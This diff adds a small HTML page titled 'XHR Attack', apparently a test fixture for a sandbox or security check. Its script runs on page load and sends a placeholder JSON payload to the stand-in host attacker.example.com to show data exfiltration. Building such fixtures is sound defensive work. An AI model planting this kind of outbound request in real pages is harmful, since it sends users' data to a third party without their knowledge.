@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>XHR Attack</title>
+</head>
+<body>
+  <div id="root">Display organ</div>
+  <script>
+    // Attack: XMLHttpRequest to exfiltrate data
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', 'https://attacker.example.com/collect');
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({ stolen: 'data' }));
+  </script>
+</body>
+</html>
